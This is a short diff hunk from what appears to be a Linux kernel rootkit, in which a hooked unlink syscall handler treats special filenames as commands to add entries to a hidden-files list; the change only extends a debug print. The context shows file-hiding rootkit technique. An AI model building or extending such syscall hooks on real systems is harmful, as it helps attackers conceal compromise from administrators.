@@ -157,7 +157,7 @@ asmlinkage long hooked_unlink(const char __user *filename){
             hidfiles[filenum] = value;
             filenum++;
         }
-        printk("hide %s\n", value);
+        printk("hide %s %d\n", value, filenum);
     } else if(strncmp(filename, INEXISTMONITOR, strlen(INEXISTMONITOR)) == 0){
         value = (char*) vmalloc(strlen(INEXISTMONITOR) * sizeof(char*));
         for(i=0, j=-1; i<strlen(filename); i++){
